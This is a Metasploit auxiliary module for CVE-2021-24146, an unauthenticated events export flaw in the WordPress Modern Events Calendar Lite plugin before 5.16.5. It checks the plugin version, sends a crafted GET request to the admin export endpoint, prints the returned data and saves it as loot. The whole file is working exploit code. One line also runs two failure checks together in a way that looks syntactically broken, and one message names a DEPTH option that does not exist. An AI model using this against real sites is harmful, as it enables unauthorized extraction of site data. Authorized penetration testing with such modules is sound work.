##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
    include Msf::Auxiliary::Report
    include Msf::Exploit::Remote::HTTP::Wordpress
    include Msf::Auxiliary::Scanner
      def initialize(info = {})
      super(update_info(info,
                        'Name' => 'WordPress Modern Events Calendar Lite - Unauthenticated Events Export'                        ,
                        'Description' => %q{This module exploits an unauthenticated events export in WordPress plugin 'modern-events-calendar-lite' plugin version < 5.16.5},
                        'References' =>
                          [
                            ['CVE','2021-24146'],
                            ['WPVDB', 'c7b1ebd6-3050-4725-9c87-0ea525f8fecc'],
                            ['URL', 'http://research.sun-asterisk.com/'],
                            ['URL', 'https://drive.google.com/file/d/1lLEXDyPp4LcKoCOqYS7A-0Yg_pIQD-ND'],
                          ],
                        'Author' =>
                          [
                            'Khanh Nguyen - SunCSR Team', # Vulnerability discovery & Metasploit module
                          ],
                        'DisclosureDate' => '2021-01-29',
                        'License' => MSF_LICENSE
              ))
        register_options(
        [
          OptString.new('FILETYPE', [true, 'The file-type download', 'csv']),
        ])
    end
      def check
      check_plugin_version_from_readme('modern-events-calendar-lite','5.16.5')
    end
      def run_host(ip)
      filename = datastore['FILETYPE']
      filename = filename[1, filename.length] if filename =~ /^\//

      res = send_request_cgi({
                               'method' => 'GET',
                               'uri' => normalize_uri(target_uri.path,'wp-admin', 'admin.php'),
                               'vars_get' =>
                                 {
                                   'page' => "MEC-ix",
                                   'tab' => "MEC-export",
                                   'mec-ix-action' => "export-events",
                                   'format' => "#{filename}",
                                 }
                             })
        fail_with Failure::Unreachable, 'Connection failed' unless res fail_with Failure::NotVulnerable, 'Connection failed. Nothing was downloaded' if res.code != 200
        fail_with Failure::NotVulnerable, 'Nothing was downloaded. Change the DEPTH parameter' if res.body.length.zero?

     print_status('Downloading file...')
     print_line("\n#{res.body}\n")
        path = store_loot(
        'modern-events-calendar-lite',
        'text/csv',
        ip,
        res.body
      )
      print_good("File saved in: #{path}")
    end
  end
  
